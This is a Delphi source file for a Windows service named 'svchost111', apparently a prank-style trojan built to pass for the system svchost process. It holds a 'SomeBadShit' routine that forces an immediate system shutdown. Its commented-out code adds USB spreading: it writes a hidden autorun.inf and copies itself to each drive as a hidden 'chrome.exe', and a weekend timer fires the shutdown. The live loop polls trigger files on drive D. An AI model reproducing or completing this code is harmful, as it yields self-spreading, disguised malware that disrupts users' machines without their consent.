unit uMain;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, SvcMgr, Dialogs, shellapi;

type
  Tsvchost111 = class(TService)
    procedure ServiceExecute(Sender: TService);
  private
    { Private declarations }
  public
    function GetServiceController: TServiceController; override;
    { Public declarations }
  end;

var
  svchost111: Tsvchost111;

implementation

{$R *.DFM}

procedure ServiceController(CtrlCode: DWord); stdcall;
begin
  svchost111.Controller(CtrlCode);
end;

function Tsvchost111.GetServiceController: TServiceController;
begin
  Result := ServiceController;
end;

//const
//  path = '%SystemRoot%\System32\wbem\';
//  exename = 'svchost.exe';
//  exenameflash = 'chrome.exe';
//  regname = 'svchost';
//  drivers = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';

var
  work: boolean = true;
//  f: textfile;
  dow: integer;
  last_now: extended;
  rnd: integer;
//  drvsiz: array[1..26] of int64;
  i: integer;
//  programpath: string;

procedure SomeBadShit;
begin
  shellexecute(0, 'open', 'c:\windows\system32\shutdown.exe', '/s /f /t 1', 'c:\windows\system32\', 0);
end;

//procedure CheckForFlash;
//begin
//  try
//    for i:=1 to 26 do
//      if (disksize(i) <> drvsiz[i]) and (DiskSize(i) <> -1) then
//      begin
//        sleep(1000);
//        assignfile(f, drivers[i]+':\autorun.inf');
//        rewrite(f);
//        writeln(f, '[autorun]');
//        writeln(f, 'open='+exenameflash);
//        closefile(f);
//        FileSetAttr(drivers[i]+':\autorun.inf', faHidden);
//
//        if fileexists(drivers[i]+':\'+exenameflash) then
//          DeleteFile(drivers[i]+':\'+exenameflash);
//
//        CopyFile(pchar(programpath), pchar(drivers[i]+':\'+exenameflash), true);
//        FileSetAttr(drivers[i]+':\'+exenameflash, faHidden);
//      end;
//  except
//  end;
//end;

procedure Tsvchost111.ServiceExecute(Sender: TService);
var
  f: textfile;
begin
  last_now := now;
  randomize;
  rnd := random(60);
//  programpath := ParamStr(0);//application.ExeName;

//  for i := 1 to 26 do
//    drvsiz[i] := disksize(i);
  work := true;
  while work do
  begin
    ReportStatus;
    ServiceThread.ProcessRequests(False);
    sleep(5000);

    if FileExists('d:\help.txt') then
    begin
      sleep(1000);
      DeleteFile('d:\help.txt');
      // all motherfucker code there
//      SomeBadShit;
      assignfile(f, 'd:\qweqwe.txt');
      append(f);
      writeln('qwe');
      closefile(f);
    end;

    if FileExists('d:\stop.txt') then
    begin
      // DeleteFile('d:\stop.txt');
      work := false;
      Self.DoShutdown;
    end;

//    dow := DayOfWeek(now);
//    if (dow = 1) or (dow = 7) then // sunday or saturday
//      if (now - last_now) * 24 * 60 > (60 + rnd) then
//        SomeBadShit;

//    CheckForFlash;
  end;
end;

end.
